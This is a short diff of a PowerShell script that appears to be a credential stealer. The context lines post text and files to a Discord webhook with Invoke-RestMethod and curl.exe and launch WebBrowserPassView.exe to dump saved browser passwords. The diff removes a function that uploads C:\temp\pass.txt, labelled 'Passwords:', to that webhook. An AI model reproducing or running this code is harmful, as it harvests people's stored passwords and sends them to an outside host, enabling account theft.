@@ -43,9 +43,6 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $DiscordUrl  -Method Post
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $DiscordUrl}
 }
 
-function Upload{
-Upload-Discord -file "C:\temp\pass.txt" -text "Passwords:"
-}
 
 function Open{
 .\WebBrowserPassView.exe
